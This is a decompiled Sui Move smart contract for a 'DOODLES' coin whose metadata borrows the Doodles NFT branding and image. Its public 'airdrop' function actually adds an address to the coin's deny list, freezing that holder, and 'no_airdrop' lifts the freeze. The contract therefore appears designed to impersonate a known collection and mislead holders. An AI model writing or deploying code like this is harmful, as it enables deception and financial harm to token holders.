module 0x35f644eb1c6206b855098164dc487c31d7ace6d3f91bed3b05d255931640e71c::doodles {
    struct DOODLES has drop {
        dummy_field: bool,
    }

    public fun airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<DOODLES>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<DOODLES>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: DOODLES, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<DOODLES>(arg0, 9, b"DOODLES", b"Doodles", b"The collectibles that started it all.", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://i.seadn.io/s/raw/files/c91c80bd4e7e8d9c01ae4cbd87c54cd7.png?auto=format&dpr=1&w=256")), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<DOODLES>>(v2);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<DOODLES>>(v1, 0x2::tx_context::sender(arg1));
        0x2::coin::mint_and_transfer<DOODLES>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<DOODLES>>(v3, 0x2::tx_context::sender(arg1));
    }

    public fun no_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<DOODLES>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<DOODLES>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

